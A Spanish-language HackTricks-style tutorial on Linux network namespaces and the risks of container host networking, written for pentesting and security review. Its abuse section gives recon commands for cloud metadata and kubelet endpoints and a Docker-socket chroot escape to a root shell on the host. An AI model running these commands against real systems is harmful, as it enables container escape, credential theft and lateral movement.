# Espacio de nombres de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Visión general

El espacio de nombres de red aísla recursos relacionados con la red, como interfaces, direcciones IP, tablas de enrutamiento, el estado ARP/vecinos, reglas de firewall, sockets y el contenido de archivos como `/proc/net`. Por eso un contenedor puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo de loopback sin poseer la pila de red real del host.

En términos de seguridad, esto importa porque el aislamiento de red es mucho más que el enlace de puertos. Un espacio de nombres de red privado limita lo que la carga de trabajo puede observar o reconfigurar directamente. Una vez que ese espacio de nombres se comparte con el host, el contenedor puede, de repente, ganar visibilidad sobre las escuchas del host, servicios locales del host y puntos de control de red que nunca debieron exponerse a la aplicación.

## Funcionamiento

Un espacio de nombres de red recién creado comienza con un entorno de red vacío o casi vacío hasta que se le adjuntan interfaces. Los runtimes de contenedores crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que la carga de trabajo tenga la conectividad esperada. En despliegues basados en bridge, esto suele significar que el contenedor ve una interfaz respaldada por veth conectada a un bridge del host. En Kubernetes, los plugins CNI manejan la configuración equivalente para la red de Pods.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` supone un cambio tan drástico. En lugar de recibir una pila de red privada preparada, la carga de trabajo se une a la pila real del host.

## Laboratorio

Puedes ver un espacio de nombres de red casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar contenedores normales y contenedores en la red del host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor que comparte la red del host ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo incluso antes de que preguntes qué capacidades tiene el proceso.

## Uso en tiempo de ejecución

Docker y Podman normalmente crean un namespace de red privado para cada contenedor salvo que se configuren de otro modo. Kubernetes normalmente asigna a cada Pod su propio namespace de red, compartido por los contenedores dentro de ese Pod pero separado del host. Los sistemas Incus/LXC también proporcionan aislamiento basado en network namespaces, a menudo con una mayor variedad de configuraciones de red virtual.

El principio común es que la red privada es la frontera de aislamiento por defecto, mientras que usar la red del host es una exclusión explícita de esa frontera.

## Malconfiguraciones

La malconfiguración más importante es simplemente compartir el namespace de red del host. Esto a veces se hace por rendimiento, monitorización a bajo nivel o conveniencia, pero elimina una de las fronteras más limpias disponibles para los contenedores. Los listeners locales del host pasan a ser accesibles de forma más directa, los servicios accesibles solo desde localhost pueden volverse alcanzables, y capacidades como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que habilitan ahora se aplican al propio entorno de red del host.

Otro problema es otorgar en exceso capacidades relacionadas con la red incluso cuando el namespace de red es privado. Un namespace privado ayuda, pero no hace que los raw sockets o el control avanzado de red sean inofensivos.

En Kubernetes, `hostNetwork: true` también cambia cuánta confianza puedes tener en la segmentación de red a nivel de Pod. Kubernetes documenta que muchos plugins de red no pueden distinguir correctamente el tráfico de Pods con `hostNetwork` para los emparejamientos `podSelector` / `namespaceSelector` y por lo tanto lo tratan como tráfico ordinario del nodo. Desde el punto de vista de un atacante, eso significa que una carga de trabajo comprometida con `hostNetwork` debe ser tratada a menudo como un punto de apoyo de red a nivel de nodo en lugar de como un Pod normal aún limitado por las mismas suposiciones de política que las cargas de trabajo en redes overlay.

## Abuso

En entornos con aislamiento débil, los atacantes pueden inspeccionar los servicios en escucha del host, alcanzar endpoints de gestión enlazados solo a loopback, interceptar o interferir con el tráfico dependiendo de las capacidades y el entorno exactos, o reconfigurar la ruta y el estado del firewall si `CAP_NET_ADMIN` está presente. En un cluster, esto también puede facilitar el movimiento lateral y el reconocimiento del plano de control.

Si sospechas que se está usando la red del host, empieza por confirmar que las interfaces visibles y los listeners pertenecen al host en vez de a una red de contenedor aislada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los loopback-only services suelen ser el primer descubrimiento interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si están presentes las capacidades de red, prueba si la carga de trabajo puede inspeccionar o alterar la pila visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En kernels modernos, la red del host junto con `CAP_NET_ADMIN` también puede exponer la ruta de los paquetes más allá de los simples cambios en `iptables` / `nftables`. Los qdiscs y filtros de `tc` también están a nivel de namespace, por lo que en un namespace de red compartido del host se aplican a las interfaces del host que el contenedor puede ver. Si `CAP_BPF` está además presente, los programas eBPF relacionados con la red, como los loaders TC y XDP, también se vuelven relevantes:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Esto importa porque un atacante podría replicar, redirigir, moldear o descartar tráfico a nivel de la interfaz del host, no solo reescribir firewall rules. En un private network namespace esas acciones quedan contenidas en la vista del container; en un shared host namespace pasan a afectar al host.

En entornos de cluster o cloud, el host networking también justifica un quick local recon de metadata y control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Ejemplo completo: Networking del host + Acceso local al runtime / Kubelet

El networking del host no proporciona automáticamente acceso root en el host, pero a menudo expone servicios que están intencionalmente accesibles solo desde el propio nodo. Si uno de esos servicios está débilmente protegido, el networking del host se convierte en una ruta directa de privilege-escalation.

Docker API en localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del cluster o movimiento lateral si kubelet o agentes locales son alcanzables
- manipulación del tráfico o denegación de servicio cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es averiguar si el proceso tiene una pila de red privada, qué rutas y puertos en escucha son visibles, y si la vista de la red ya se asemeja a la del host antes incluso de que pruebes las capacidades.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Lo interesante aquí:

- Si `/proc/self/ns/net` y `/proc/1/ns/net` ya parecen del host, el contenedor puede estar compartiendo el namespace de red del host u otro namespace no privado.
- `lsns -t net` y `ip netns identify` son útiles cuando la shell ya está dentro de un namespace nombrado o persistente y quieres correlacionarlo con los objetos `/run/netns` desde el lado del host.
- `ss -lntup` es especialmente valioso porque revela puertos en escucha solo en loopback y endpoints de gestión locales.
- Rutas, nombres de interfaz, contexto del firewall, estado de `tc` y attachments eBPF se vuelven mucho más importantes si `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF` están presentes.
- En Kubernetes, la resolución fallida de un nombre de servicio desde un Pod con `hostNetwork` puede simplemente significar que el Pod no está usando `dnsPolicy: ClusterFirstWithHostNet`, no que el servicio esté ausente.

Al revisar un contenedor, siempre evalúa el namespace de red junto con el conjunto de capacidades. El networking en el host combinado con capacidades de red elevadas representa una postura muy distinta al networking por bridge con un conjunto limitado de capacidades por defecto.

## Referencias

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
